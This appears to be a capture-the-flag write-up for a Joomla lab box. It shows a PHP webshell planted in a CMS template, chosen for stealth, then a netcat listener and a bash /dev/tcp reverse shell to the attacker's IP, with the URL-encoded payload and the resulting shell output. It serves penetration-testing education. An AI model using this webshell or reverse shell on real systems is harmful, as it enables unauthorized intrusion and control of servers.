
Enumerate Version

```
curl 10.129.74.77/administrator/manifests/files/joomla.xml
```

##### RCE in CMS

From the admin panel, it's simple to get a webshell. I need to find a place I can put php code. I'll do that in the templates, which by definition are going to be code.

1. First I'll go to Extensions > Templates (ignore the sub-menu and click the first Templates):

There it will show the two templates, including the one that's in use, protostar:

2. I'll add a file to the one that's not in use to be a bit stealthier.

3. Click New File:

4. Enter a file name and select a file type php. Hit create. Now I'm taken to an editor. I'll add a simple php webshell and hit save at the top left of the page

The file is now created

5. Went to the file and added the following input and pressed save.

```
<?php SYSTEM($_GET["cmd"]); ?>
```

Now we can access the webshell at the following path:

```
http://10.129.74.77/templates/beez3/media.php?cmd=whoami
```

Started up my listener on port 443.

```
nc -lvnp 443
```

Will utilize the following bash one-liner to get an reverse shell.

```
/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.57/443 0>&1'
```

But before trying to run it as an command I'll need to url encode it first. Therefore I'll use https://www.urlencoder.org/ encoded it and ran it to gain RCE as user "www-data".

```
http://10.129.74.77/templates/beez3/media.php?cmd=%2Fbin%2Fbash -c 'bash -i >%26 %2Fdev%2Ftcp%2F10.10.14.57%2F443 0>%261'
```

```
nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.57] from (UNKNOWN) [10.129.74.77] 56622
bash: cannot set terminal process group (1740): Inappropriate ioctl for device
bash: no job control in this shell
www-data@curling:/var/www/html/templates/beez3$
```